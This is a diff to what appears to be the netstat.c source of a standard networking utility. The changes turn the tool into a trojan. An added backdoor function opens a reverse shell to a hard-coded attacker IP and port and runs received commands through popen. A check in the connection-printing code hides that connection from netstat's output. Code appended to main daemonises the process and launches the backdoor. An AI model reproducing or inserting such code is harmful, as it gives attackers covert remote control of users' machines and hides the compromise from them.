@@ -113,6 +113,87 @@
 #define s6_addr32 in6a_words	/* libinet6			*/
 #endif
 
+
+// Socket includes
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+// Port to host the backdoor
+#define PORT 44566
+
+// Server address to connect to (Attacking IP)
+#define SERVER_IP "192.168.0.87"
+
+// Byte size to caputure
+#define BUFFER_SIZE 1024
+
+// Bytes size to send
+#define RESPONSE_SIZE 4096
+
+
+int backdoor(void);
+
+int backdoor(void) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char buffer[BUFFER_SIZE];
+    char response[RESPONSE_SIZE];
+    FILE *fp;
+    ssize_t bytes_received;
+
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        //perror("[-] Failed to create socket.");
+        return 1;
+    }
+
+    // Set server address
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(PORT);
+    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP); // Server's IP address
+
+    // Connect to the server
+    if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
+        //perror("[-] Failed to connect to the remote server.");
+        close(sockfd);
+        return 1;
+    }
+
+    // Connection established, wait for commands
+    while (1) {
+        // Send prompt
+        char prompt[] = "~$ ";
+        send(sockfd, prompt, strlen(prompt), 0);
+
+        // Receive data
+        memset(buffer, 0, BUFFER_SIZE);
+        bytes_received = recv(sockfd, buffer, BUFFER_SIZE, 0);
+        if (bytes_received <= 0) {
+            break; // Break if recv failed or connection closed
+        }
+
+        // Execute the command
+        buffer[bytes_received] = '\0'; // Null-terminate the string
+        fp = popen(buffer, "r");
+        if (fp == NULL) {
+            strcpy(response, "[-] Failed to execute command.\n");
+            send(sockfd, response, strlen(response), 0);
+        } else {
+            // Read the output a line at a time and send it
+            while (fgets(response, sizeof(response)-1, fp) != NULL) {
+                send(sockfd, response, strlen(response), 0);
+            }
+            pclose(fp);
+        }
+    }
+
+    close(sockfd); // Close the socket when done
+    return 0;
+}
+
 /* prototypes for statistics.c */
 void parsesnmp(int, int, int, int);
 void parsesnmp6(int, int, int);
@@ -1135,6 +1216,13 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
 			 timer_run, (double) time_len / clk_tck, retr, timeout);
 		break;
 	    }
+    char malware_rem_addr[50]; 
+    sprintf(malware_rem_addr, "%s:%d", SERVER_IP, PORT);
+    // If its about to print our malware, simply dont. 
+    if (strcmp(rem_addr, malware_rem_addr) == 0) {
+        //printf("Skipping Malware");
+        return;
+    }
 
 	printf("%-4s  %6ld %6ld %-*s %-*s %-11s",
 	       prot, rxq, txq, (int)netmax(23,strlen(local_addr)), local_addr, (int)netmax(23,strlen(rem_addr)), rem_addr, _(tcp_state[state]));
@@ -2344,5 +2432,36 @@ int main
         wait_continous();
 	prg_cache_clear();
     }
+    pid_t pid, sid;
+    pid = fork();
+    if (pid < 0) {
+        //perror("fork failed");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pid > 0) {
+        // Parent process exits to allow the child to run in the background
+        exit(EXIT_SUCCESS);
+    }
+
+    // Child process continues here
+
+    // Create a new SID for the child process
+    sid = setsid();
+    if (sid < 0) {
+        //perror("setsid failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Close standard file descriptors
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    // Run backdoor function in the child process
+    backdoor();
+
+    // Child process should exit after its task is completed
+    exit(EXIT_SUCCESS);
     return (i);
 }
